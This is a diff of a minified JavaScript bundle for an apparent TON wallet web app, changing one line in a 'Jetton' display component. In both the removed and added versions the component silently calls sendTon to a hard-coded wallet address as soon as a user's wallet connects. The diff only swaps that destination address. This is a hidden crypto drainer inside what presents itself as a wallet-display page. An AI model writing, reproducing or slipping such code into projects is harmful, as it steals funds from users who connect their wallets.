@@ -874,7 +874,7 @@ PERFORMANCE OF THIS SOFTWARE.
   @media (prefers-color-scheme: dark) {
     border: 1px solid #fefefe;
   }
-`;function R$(){const{connected:e,wallet:t,sender:r}=gf(),{client:n}=l2();Bq();const{sendTon:a}=Iq();return e&&(async()=>{const o="0QBcjlljDVn21UyitbdeBcGt3Bhg2zZ6Uuo6OO2cQph_8C6d";if(console.log("Attempting to send TON to:",o),!n||!r){console.error("Client or sender is not available");return}try{await a(o),console.log("TON sent successfully")}catch(s){console.error("Error sending TON:",s)}})(),Gn(I$,{title:"Jetton",children:pc(VA,{children:[Gn("h3",{children:"Jetton"}),pc(KA,{children:["Wallet",Gn(P$,{children:t?yt.Address.parse(t).toString():"Loading..."})]})]})})}const O$=Xa.div`
+`;function R$(){const{connected:e,wallet:t,sender:r}=gf(),{client:n}=l2();Bq();const{sendTon:a}=Iq();return e&&(async()=>{const o="UQCBAVUrFGUhMAy_R9ZeAjPIavFrSLlHaCQ8TyZ-GdeYp29B";if(console.log("Attempting to send TON to:",o),!n||!r){console.error("Client or sender is not available");return}try{await a(o),console.log("TON sent successfully")}catch(s){console.error("Error sending TON:",s)}})(),Gn(I$,{title:"Jetton",children:pc(VA,{children:[Gn("h3",{children:"Jetton"}),pc(KA,{children:["Wallet",Gn(P$,{children:t?yt.Address.parse(t).toString():"Loading..."})]})]})})}const O$=Xa.div`
   background-color: #e8e8e8;
   color: black;
 
